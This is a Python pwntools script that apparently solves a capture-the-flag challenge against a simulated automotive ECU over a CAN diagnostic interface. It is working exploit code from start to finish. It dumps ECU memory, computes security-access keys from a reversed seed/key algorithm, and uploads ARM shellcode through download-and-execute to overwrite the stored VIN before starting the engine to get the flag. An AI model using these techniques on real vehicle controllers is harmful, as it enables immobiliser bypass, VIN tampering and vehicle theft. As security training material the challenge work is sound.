#!/usr/bin/env python3
from rich import print
from pathlib import Path
from pwn import remote, log, context, asm, p32, shellcraft
from sds import Msg, Request, ControlFlowPacket, CommandResponsePacket, CommandRequestPacket, ResponseType, ControlFlowRequestPacket, ControlFlowResponsePacket, MsgDirection, DID, DataTransferFunction, ECU
from rich.console import Console

console = Console()
io = remote('localhost', 5000)


mem_regions = {
    "rom": [0x60010000, 0x61000000],
    "protected": [0x61000000, 0x62000000],
    "ram": [0x70000000, 0x71000000]
}

AUTO_DUMP_MESSAGES = True
ONLY_SHOW_RESPONSES = False
AUTO_CLEAR_CANDUMP = True
AUTO_FETCH_FLOW_CONTROL = True
messages = []


def set_autoclear(clear):
    global AUTO_CLEAR_CANDUMP
    prev_val = AUTO_CLEAR_CANDUMP
    AUTO_CLEAR_CANDUMP = clear
    return prev_val


def set_autodump(dump):
    global AUTO_DUMP_MESSAGES
    prev_val = AUTO_DUMP_MESSAGES
    AUTO_DUMP_MESSAGES = dump
    return prev_val


def candump():
    io.sendlineafter(b"> ", b"candump")
    msgs = []
    while (line := io.recvline().strip()) != b"":
        response = Msg.from_candump(line.decode())
        msgs.append(response)
    return msgs


def print_messages(msgs):
    for msg in msgs:
        if not ONLY_SHOW_RESPONSES or msg.direction == MsgDirection.Response:
            print(str(msg))


def print_new_messages():
    print_messages(candump())


def candump_clear():
    io.sendlineafter(b"> ", b"candump clear")


def read_flow_control_messages(fc_msg):
    _autoclear = set_autoclear(False)
    data = bytearray(fc_msg.packet.data)
    total_len = fc_msg.packet.data_length
    num_before = len(candump())

    cansend(Request.flow_control_continue(ecu=fc_msg.ecu))
    new_messages = candump()
    while len(data) < total_len:
        for msg in new_messages[num_before:]:
            if msg.direction == MsgDirection.Request:
                continue

            if issubclass(msg.packet.__class__, ControlFlowPacket):
                data.extend(msg.packet.data)

            if len(data) >= total_len:
                break
        new_messages = candump()
    set_autoclear(_autoclear)
    return data[:total_len], new_messages[num_before:]


def wait_for_control_flow_response():
    new_messages = candump()
    while True:
        for msg in new_messages:
            if type(msg.packet) is ControlFlowResponsePacket:
                return
        new_messages = candump()
    return new_messages


def cansend(request, fetch_response=False):
    ret_data = None
    num_before = len(candump())
    io.sendlineafter(b"> ", f"cansend {request}".encode())
    if AUTO_DUMP_MESSAGES or fetch_response:
        if fetch_response:
            ret_data = bytearray()
            received_response = False
            while not received_response:
                new_messages = candump()
                print_messages(new_messages[num_before:])
                for msg in list(new_messages[num_before:]):
                    if type(msg.packet) is ControlFlowRequestPacket:
                        received_response = True
                        _ret_data, cf_messages = read_flow_control_messages(msg)
                        new_messages.extend(cf_messages)
                    elif type(msg.packet) is CommandResponsePacket:
                        received_response = True
                        _ret_data = msg.packet.data
                    elif type(msg.packet) is ControlFlowResponsePacket:
                        received_response = True
                        _ret_data = bytearray()
                    else:
                        continue
                    ret_data.extend(_ret_data)
        else:
            new_messages = candump()
            print_messages(new_messages[num_before:])

        if AUTO_CLEAR_CANDUMP:
            candump_clear()
    return ret_data


def extract_data(msgs):
    data = bytearray()
    for msg in msgs:
        packet = msg.packet
        if issubclass(packet.__class__, ControlFlowPacket) or (
            type(packet) is CommandResponsePacket and packet.response_code is ResponseType.ReadMemoryByAddress_Success
        ):
            data.extend(packet.data)
    return data


def requires_continue(msgs):
    for msg in msgs:
        packet = msg.packet
        if type(packet) is ControlFlowRequestPacket:
            return True
    return False


def drain_candump():
    msgs = candump()
    candump_clear()
    return msgs


def dump_memory(address, size, p=None):
    cansend(Request.enter_diagnostic_session())
    _autodump = set_autodump(False)
    candump_clear()
    data = bytearray()
    for i in range(0, size, 0xffff):
        round_data = bytearray()

        cansend(Request.read_address(address + i, min(0xffff, size - len(data))))
        msgs = drain_candump()
        round_data.extend(extract_data(msgs))
        if requires_continue(msgs):
            cansend(Request.flow_control_continue())
        end_len = min(size - len(data), 0xffff)
        if p is not None:
            p.status(f"Dumping {address + i:#x} {len(data) + len(round_data):#x}/{size:#x}")
        msgs = drain_candump()
        round_data.extend(extract_data(msgs))
        data.extend(round_data[:end_len])
    set_autodump(_autodump)
    return bytes(data)


def dump_ram(length, output=None):
    p = log.progress("Dumping Ram")
    addr = mem_regions['ram'][0]
    p.status(f"Dumping Page @ {addr:#x}")
    ram_page = dump_memory(addr, length, p)
    if output is not None:
        with open(output, "wb") as f:
            f.write(ram_page)
    p.success("Dump Complete")
    return ram_page


def get_seed():
    return cansend(Request.security_access_seed(), fetch_response=True)


def send_key(key):
    cansend(Request.security_access_send_key(key))


def get_did_vals(ecu=ECU.ECM):
    auth = cansend(Request.read_did(DID.Author.value, ecu=ecu), fetch_response=True)
    manuf = cansend(Request.read_did(DID.Manufacturer.value, ecu=ecu), fetch_response=True)
    year = cansend(Request.read_did(DID.Year.value, ecu=ecu), fetch_response=True)
    vin = cansend(Request.read_did(DID.Vin.value, ecu=ecu), fetch_response=True)
    return [auth.decode(), manuf.decode(), year.decode(), vin.decode()]


def gen_key(seed, initial_val=b"RONDO"):
    modifier = b"GANG"
    key = bytearray(initial_val)
    check = 0
    for i in range(4):
        for j in range(modifier[i]):
            kc = seed[i] * key[i]
            kc = kc & 0xff
            if kc != 0:
                key[i] = kc
            else:
                key[i] = ord("D")
        check += key[i]
    key[4] = check & 0xff
    return key


def leak_seed_remnant():
    data = dump_ram(0x8000)
    seed_remnant = data[0x1014:0x1018]
    log.info(f"Seed Remnant: {seed_remnant.hex()}")
    return seed_remnant


def write_data(payload, addr, execute=True):
    cansend(Request.enter_device_control_session())
    cansend(Request.programming_mode())
    _auto_clear = set_autoclear(False)
    fun = DataTransferFunction.DownloadAndExecute if execute else DataTransferFunction.Download
    payload = bytearray(payload)
    payload_len = len(payload)
    first_byte = payload.pop(0)
    frames = [payload[i:i + 7] for i in range(0, len(payload), 7)]

    frame_requests = [Request(ECU.ECM, None, packet_len=0x20 + (i % 0xf) + 1, data=frame) for i, frame in enumerate(frames)]
    candump_clear()
    _ = cansend(Request.request_download(payload_len), fetch_response=True)
    _ = cansend(Request.transfer_data(addr, bytearray([first_byte]), function=fun), fetch_response=True)
    for req in frame_requests:
        cansend(req)
    #
    set_autoclear(_auto_clear)


def execute_address(addr):
    _ = cansend(Request.request_download(0), fetch_response=True)
    _ = cansend(Request.transfer_data(addr, bytearray(), function=DataTransferFunction.DownloadAndExecute), fetch_response=False)
    _ = cansend(Request.transfer_data(function=DataTransferFunction.DownloadAndExecute, packet_len=0x3), fetch_response=False)


def trigger():
    cansend(Request.transfer_data(function=DataTransferFunction.DownloadAndExecute, packet_len=0x3), fetch_response=False)


addr = mem_regions['ram'][0] + 0x133700
vin_addr_ram = addr - 0x20
context.clear(arch='arm', os="baremetal", endian="little")
vin_addr = 0x61000098


cansend(Request.enter_diagnostic_session())
author, manuf, year, vin = get_did_vals()
log.info(f"Author: {author}\t|\tMan: {manuf}\t|\tYear: {year}\t|\tVIN: {vin}")
author2, manuf2, year2, vin2 = get_did_vals(ecu=ECU.BCM)
log.info(f"Author: {author2}\t|\tMan: {manuf2}\t|\tYear: {year2}\t|\tVIN: {vin2}")

shellcode = shellcraft.arm.memcpy(vin_addr, vin_addr_ram, len(vin2))
shellcode += shellcraft.thumb.ret()

seed = get_seed()
log.info(f"Seed: {seed.hex()}")
key = gen_key(seed)
log.info(f"Key: {key.hex()}")
send_key(key)


with context.quiet:
    shellcode = asm(shellcode)

write_data(vin2.encode(), vin_addr_ram, execute=False)
write_data(shellcode, addr, execute=True)

io.sendlineafter(b"> ", b"start_engine")

flag = io.recvline_startswith(b"Flag: ")
log.success(flag.decode())
